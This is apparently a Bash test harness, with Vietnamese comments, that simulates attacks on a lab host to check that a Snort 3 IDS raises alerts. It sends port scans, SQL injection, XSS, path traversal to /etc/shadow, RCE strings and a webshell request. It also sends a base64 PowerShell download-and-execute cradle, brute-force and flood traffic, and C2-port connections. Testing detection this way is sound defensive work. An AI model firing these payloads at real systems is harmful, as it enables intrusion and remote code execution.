#!/bin/bash
# =========================================================================
# BK-IDS SOC: RED TEAM ATTACK SIMULATION SCRIPT (v2.0)
# Mục đích: Kiểm thử Snort 3 IDS bằng cách giả lập các kiểu tấn công
# thực tế mà hệ thống bảo vệ SOC Dashboard phải phát hiện được.
# =========================================================================

TARGET="192.168.13.129"
API_PORT="5050"
WEB_PORT="8080"
SSH_PORT="22"
MYSQL_PORT="3306"
LOG_FILE="/home/ids/bk_ids/snort_logs/alert_json.txt"

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

echo -e "${CYAN}"
echo "╔══════════════════════════════════════════════════════════════╗"
echo "║  BK-IDS SOC: RED TEAM ATTACK SIMULATION                    ║"
echo "║  Target: ${TARGET}                                        ║"
echo "║  Time:   $(date '+%Y-%m-%d %H:%M:%S')                             ║"
echo "╚══════════════════════════════════════════════════════════════╝"
echo -e "${NC}"

# ----- Kiểm tra Snort có đang chạy -----
echo -e "\n${YELLOW}[CHECK] Kiem tra Snort IDS status...${NC}"
if docker ps | grep -q bkids_snort_engine; then
    echo -e "${GREEN}[OK] Snort 3 IDS Engine DANG CHAY${NC}"
else
    echo -e "${RED}[FAIL] Snort 3 IDS Engine KHONG chay!${NC}"
    echo "Chay: cd /home/ids/bk_ids && docker compose up -d bkids_snort_engine"
    exit 1
fi

# ----- Chờ alert file -----
sleep 3

# ================================================================
# TẦNG 1: RECONNAISSANCE (Trinh sát)
# ================================================================
echo -e "\n${RED}━━━ TANG 1: RECONNAISSANCE (Trinh sat) ━━━${NC}"

echo -e "\n${YELLOW}[TEST 1.1] ICMP Ping Sweep (host discovery)${NC}"
ping -c 3 -i 0.5 ${TARGET} > /dev/null 2>&1
echo "  -> Gui 3 ICMP echo request den ${TARGET}"
sleep 2

echo -e "\n${YELLOW}[TEST 1.2] TCP SYN Scan (port scan) qua Nmap${NC}"
if command -v nmap &> /dev/null; then
    nmap -sS -p 22,80,8080,5050,3306 --max-retries 1 --host-timeout 10s ${TARGET} > /dev/null 2>&1
    echo "  -> SYN scan ports: 22,80,8080,5050,3306"
else
    # Fallback: dùng bash để scan
    for port in 22 80 8080 5050 3306; do
        timeout 1 bash -c "echo >/dev/tcp/${TARGET}/${port}" 2>/dev/null && echo "  -> Port ${port}: OPEN" || true
    done
fi
sleep 2

echo -e "\n${YELLOW}[TEST 1.3] TCP Nmap FIN Scan (stealth)${NC}"
if command -v nmap &> /dev/null; then
    nmap -sF -p 1-100 --host-timeout 10s ${TARGET} > /dev/null 2>&1
    echo "  -> FIN scan ports 1-100 (stealth mode)"
fi
sleep 3

# ================================================================
# TẦNG 2: WEB ATTACKS (Tấn công Web)
# ================================================================
echo -e "\n${RED}━━━ TANG 2: WEB LAYER ATTACKS (Tan cong Web) ━━━${NC}"

echo -e "\n${YELLOW}[TEST 2.1] SQL Injection — UNION SELECT${NC}"
curl -s "http://${TARGET}:${API_PORT}/api/users?id=1 UNION SELECT 1,2,3--" > /dev/null 2>&1
echo "  -> Payload: ?id=1 UNION SELECT 1,2,3--"
sleep 1

echo -e "\n${YELLOW}[TEST 2.2] SQL Injection — OR-based bypass${NC}"
curl -s "http://${TARGET}:${API_PORT}/api/login?user=admin' OR 1=1--" > /dev/null 2>&1
echo "  -> Payload: user=admin' OR 1=1--"
sleep 1

echo -e "\n${YELLOW}[TEST 2.3] SQL Injection — convert(int,@@version) MSSQL${NC}"
curl -s "http://${TARGET}:${WEB_PORT}/page?id=1;select convert(int,@@version)--" > /dev/null 2>&1
echo "  -> Payload: ;select convert(int,@@version)--"
sleep 1

echo -e "\n${YELLOW}[TEST 2.4] SQL Injection — SLEEP time-based blind${NC}"
curl -s "http://${TARGET}:${WEB_PORT}/api/data?id=1' AND SLEEP(5)--" > /dev/null 2>&1 &
echo "  -> Payload: ?id=1' AND SLEEP(5)-- (background)"
sleep 2

echo -e "\n${YELLOW}[TEST 2.5] XSS — Script tag injection${NC}"
curl -s "http://${TARGET}:${WEB_PORT}/search?q=<script>alert(document.cookie)</script>" > /dev/null 2>&1
echo "  -> Payload: <script>alert(document.cookie)</script>"
sleep 1

echo -e "\n${YELLOW}[TEST 2.6] XSS — javascript URI scheme${NC}"
curl -s "http://${TARGET}:${WEB_PORT}/redirect?url=javascript:alert('XSS')" > /dev/null 2>&1
echo "  -> Payload: javascript:alert('XSS')"
sleep 1

echo -e "\n${YELLOW}[TEST 2.7] Path Traversal — /etc/passwd${NC}"
curl -s "http://${TARGET}:${WEB_PORT}/file?path=../../../../etc/passwd" > /dev/null 2>&1
echo "  -> Payload: ?path=../../../../etc/passwd"
sleep 1

echo -e "\n${YELLOW}[TEST 2.8] Path Traversal — /etc/shadow${NC}"
curl -s "http://${TARGET}:${WEB_PORT}/download?file=../../../etc/shadow" > /dev/null 2>&1
echo "  -> Payload: ?file=../../../etc/shadow"
sleep 1

echo -e "\n${YELLOW}[TEST 2.9] Remote Code Execution — PHP eval()${NC}"
curl -s "http://${TARGET}:${WEB_PORT}/exec?cmd=eval(system(id))" > /dev/null 2>&1
echo "  -> Payload: ?cmd=eval(system(id))"
sleep 1

echo -e "\n${YELLOW}[TEST 2.10] RCE — PHP system() call${NC}"
curl -s "http://${TARGET}:${WEB_PORT}/api/run?c=system('whoami')" > /dev/null 2>&1
echo "  -> Payload: ?c=system('whoami')"
sleep 1

echo -e "\n${YELLOW}[TEST 2.11] WebShell — c99shell${NC}"
curl -s "http://${TARGET}:${WEB_PORT}/shell/c99shell.php" > /dev/null 2>&1
echo "  -> URL: /shell/c99shell.php"
sleep 1

echo -e "\n${YELLOW}[TEST 2.12] RCE — cmd.exe in URI${NC}"
curl -s "http://${TARGET}:${WEB_PORT}/exec?cmd=cmd.exe /c dir" > /dev/null 2>&1
echo "  -> Payload: ?cmd=cmd.exe /c dir"
sleep 1

echo -e "\n${YELLOW}[TEST 2.13] RCE — powershell in URI${NC}"
curl -s "http://${TARGET}:${WEB_PORT}/api/ps?c=powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AbQBhAGsAawBlAHIAaQBzAGEALgBtAGUALwBwAHMAJwApAA==" > /dev/null 2>&1
echo "  -> Payload: powershell -enc <base64>"
sleep 1

# ================================================================
# TẦNG 3: BRUTE FORCE ATTACKS
# ================================================================
echo -e "\n${RED}━━━ TANG 3: BRUTE FORCE ATTACKS ━━━${NC}"

echo -e "\n${YELLOW}[TEST 3.1] SSH Brute Force simulation${NC}"
for i in $(seq 1 6); do
    timeout 1 bash -c "echo >/dev/tcp/${TARGET}/${SSH_PORT}" 2>/dev/null
    echo "  -> SSH connection attempt #${i}"
    sleep 0.3
done
sleep 2

echo -e "\n${YELLOW}[TEST 3.2] MySQL Brute Force simulation${NC}"
for i in $(seq 1 6); do
    timeout 1 bash -c "echo >/dev/tcp/${TARGET}/${MYSQL_PORT}" 2>/dev/null
    echo "  -> MySQL connection attempt #${i}"
    sleep 0.3
done
sleep 2

# ================================================================
# TẦNG 4: DoS ATTACKS (Chỉ simulation nhẹ)
# ================================================================
echo -e "\n${RED}━━━ TANG 4: DoS SIMULATION (nhe) ━━━${NC}"

echo -e "\n${YELLOW}[TEST 4.1] HTTP Flood simulation (50 requests in 5s)${NC}"
for i in $(seq 1 55); do
    curl -s "http://${TARGET}:${API_PORT}/" > /dev/null 2>&1 &
    if [ $((i % 10)) -eq 0 ]; then
        echo "  -> Sent $i HTTP requests..."
    fi
done
wait
echo "  -> Tong: 55 requests gui trong ~2s"
sleep 5

# ================================================================
# TẦNG 5: C2 COMMUNICATION SIMULATION
# ================================================================
echo -e "\n${RED}━━━ TANG 5: C2 / BACKDOOR SIMULATION ━━━${NC}"

echo -e "\n${YELLOW}[TEST 5.1] Outbound connection to Metasploit port 4444${NC}"
timeout 1 bash -c "echo >/dev/tcp/${TARGET}/4444" 2>/dev/null
echo "  -> Khoi tao ket noi outbound den port 4444"
sleep 1

echo -e "\n${YELLOW}[TEST 5.2] Outbound connection to C2 port 1337${NC}"
timeout 1 bash -c "echo >/dev/tcp/${TARGET}/1337" 2>/dev/null
echo "  -> Khoi tao ket noi outbound den port 1337"
sleep 1

echo -e "\n${YELLOW}[TEST 5.3] Outbound connection to BackOrifice port 31337${NC}"
timeout 1 bash -c "echo >/dev/tcp/${TARGET}/31337" 2>/dev/null
echo "  -> Khoi tao ket noi outbound den port 31337"
sleep 1

# ================================================================
# KẾT QUẢ: Kiểm tra Snort Alerts
# ================================================================
echo -e "\n${CYAN}╔══════════════════════════════════════════════════════════════╗${NC}"
echo -e "${CYAN}║  KET QUA SNORT IDS ALERTS                                   ║${NC}"
echo -e "${CYAN}╚══════════════════════════════════════════════════════════════╝${NC}"

sleep 5

echo -e "\n${YELLOW}[*] Kiem tra alert log: ${LOG_FILE}${NC}"
if [ -f "${LOG_FILE}" ]; then
    ALERT_COUNT=$(wc -l < "${LOG_FILE}" 2>/dev/null || echo 0)
    echo -e "\n${GREEN}=== Snort da phat hien ${ALERT_COUNT} alerts ===${NC}\n"
    cat "${LOG_FILE}" 2>/dev/null | tail -30
else
    echo -e "${YELLOW}[!] Alert file chua duoc tao. Kiem tra container log:${NC}"
    docker logs bkids_snort_engine 2>&1 | grep -E "alert|Alert|ALERT|action|permitted|blocked" | tail -20
fi

echo -e "\n${CYAN}╔══════════════════════════════════════════════════════════════╗${NC}"
echo -e "${CYAN}║  TONG KET RED TEAM SIMULATION                               ║${NC}"
echo -e "${CYAN}╠══════════════════════════════════════════════════════════════╣${NC}"
echo -e "${CYAN}║  Tang 1 (Recon):    Ping sweep, SYN scan, FIN scan         ║${NC}"
echo -e "${CYAN}║  Tang 2 (Web):      SQLi x5, XSS x2, LFI x2, RCE x5       ║${NC}"
echo -e "${CYAN}║  Tang 3 (Brute):    SSH x6, MySQL x6                      ║${NC}"
echo -e "${CYAN}║  Tang 4 (DoS):      HTTP Flood 55 req                      ║${NC}"
echo -e "${CYAN}║  Tang 5 (C2):       Ports 4444, 1337, 31337               ║${NC}"
echo -e "${CYAN}╚══════════════════════════════════════════════════════════════╝${NC}"

# Hiện alert count theo nhóm
echo -e "\n${YELLOW}[*] Phan loai alerts:${NC}"
if [ -f "${LOG_FILE}" ]; then
    echo "  BLOCK actions:"
    grep -c "drop\|block\|reject" "${LOG_FILE}" 2>/dev/null || echo "  0"
    echo "  ALERT actions:"
    grep -c "\"action\":\"alert\"" "${LOG_FILE}" 2>/dev/null || echo "  0"
fi

echo -e "\n${GREEN}[HOAN THANH] Chay xong Red Team Simulation.${NC}"
echo -e "Kiểm tra dashboard SOC tại: http://${TARGET}:9000"
